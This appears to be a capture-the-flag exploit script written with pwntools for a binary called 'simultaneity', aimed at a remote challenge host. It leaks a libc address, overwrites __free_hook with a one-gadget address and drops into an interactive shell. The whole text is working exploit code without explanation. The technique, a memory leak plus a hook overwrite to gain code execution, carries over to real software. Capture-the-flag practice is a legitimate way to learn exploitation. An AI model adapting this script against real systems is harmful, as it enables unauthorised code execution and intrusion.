#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./simultaneity')

if args.REMOTE:
	p = remote('mc.ax', 31547)
	libc = ELF('./libc.so.6')
	libc.symbols['gadget'] = [0x4484f,0x448a3,0xe5456][1]
else:
	p = process(binary.path)
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p.sendlineafter('big?\n','10000000')
p.recvuntil('here: ')
libc.address = int(p.recvline().strip(),16) + 10002416
log.info('libc.address: ' + hex(libc.address))
log.info('libc.sym.__free_hook: ' + hex(libc.sym.__free_hook))

p.sendlineafter('far?\n',str((libc.sym.__free_hook - libc.address + 10002416) // 8))
p.sendlineafter('what?\n',65536*'0' + str(libc.sym.gadget))
p.interactive()
